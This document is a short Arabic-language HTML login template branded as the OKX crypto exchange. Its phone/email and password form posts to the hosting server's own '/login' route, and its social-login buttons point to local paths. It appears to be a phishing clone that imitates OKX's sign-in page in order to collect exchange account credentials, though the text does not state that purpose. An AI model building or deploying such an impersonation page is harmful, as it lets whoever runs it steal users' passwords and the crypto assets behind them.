<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>تسجيل الدخول | OKX</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { direction: rtl; font-family: sans-serif; background: #fff; }
        .login-box { max-width: 400px; margin: 50px auto; padding: 20px; }
        .tabs { display: flex; border-bottom: 1px solid #eee; margin-bottom: 20px; }
        .tab { padding: 10px 20px; cursor: pointer; color: #666; }
        .tab.active { color: #000; border-bottom: 2px solid #000; font-weight: bold; }
        .form-control { border-radius: 12px; padding: 15px; background: #f5f5f5; border: none; margin-bottom: 15px; }
        .btn-next { background: #eee; color: #aaa; border-radius: 30px; border: none; width: 100%; padding: 15px; font-weight: bold; }
        .btn-next.enabled { background: #000; color: #fff; cursor: pointer; }
        .social-btn { border: 1px solid #ddd; border-radius: 30px; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px; text-decoration: none; color: #000; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="/logo.png" width="80" style="margin-bottom: 30px;">
    <h1>تسجيل الدخول</h1>
    
<div class="tabs">
        <div class="tab active" id="phoneTab" onclick="switchTab('phone')">الهاتف</div>
        <div class="tab" id="emailTab" onclick="switchTab('email')">البريد الإلكتروني / الحساب الفرعي</div>
    </div>

<form action="/login" method="post">
        <input type="text" name="text" id="loginInput" class="form-control" placeholder="رقم الهاتف">
        <input type="password" name="password" class="form-control" placeholder="كلمة المرور">
        
<button type="submit" class="btn-next enabled">التالي</button>
    </form>

<div class="text-center my-3" style="color: #888;">أو تابع مع</div>

<a href="/login/google" class="social-btn"><img src="/google.png" width="20"> Google</a>
    <a href="/login/apple" class="social-btn"><img src="/apple.png" width="20"> Apple</a>
</div>

<script>
    function switchTab(type) {
        const input = document.getElementById('loginInput');
        const phoneTab = document.getElementById('phoneTab');
        const emailTab = document.getElementById('emailTab');

        if (type === 'phone') {
            input.placeholder = 'رقم الهاتف';
            phoneTab.classList.add('active');
            emailTab.classList.remove('active');
        } else {
            input.placeholder = 'البريد الإلكتروني / الحساب الفرعي';
            emailTab.classList.add('active');
            phoneTab.classList.remove('active');
        }
    }
</script>

</body>
</html>
